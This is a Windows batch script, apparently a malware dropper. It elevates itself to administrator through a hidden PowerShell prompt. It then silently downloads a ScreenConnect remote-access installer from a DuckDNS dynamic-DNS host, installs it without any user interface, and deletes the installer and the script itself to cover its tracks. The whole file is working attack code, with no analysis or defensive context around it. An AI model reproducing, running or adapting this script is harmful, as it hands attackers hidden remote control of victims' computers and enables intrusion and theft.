@echo off
setlocal EnableExtensions


net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)


set "URL=http://alkaliner.duckdns.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI=%TEMP%\pkg.msi"


set RETRIES=3
set COUNT=0

:download
set /a COUNT+=1
powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri '%URL%' -OutFile '%MSI%' -ErrorAction Stop} catch {exit 1}"

if not exist "%MSI%" (
    if %COUNT% LSS %RETRIES% (
        timeout /t 2 >nul
        goto download
    ) else (
        goto selfdelete
    )
)


msiexec /i "%MSI%" /qn /norestart >nul 2>&1


:cleanup
if exist "%MSI%" del /f /q "%MSI%" >nul 2>&1


:selfdelete
powershell -WindowStyle Hidden -Command ^
"Start-Sleep -Seconds 2; Remove-Item -LiteralPath '%~f0' -Force"

exit /b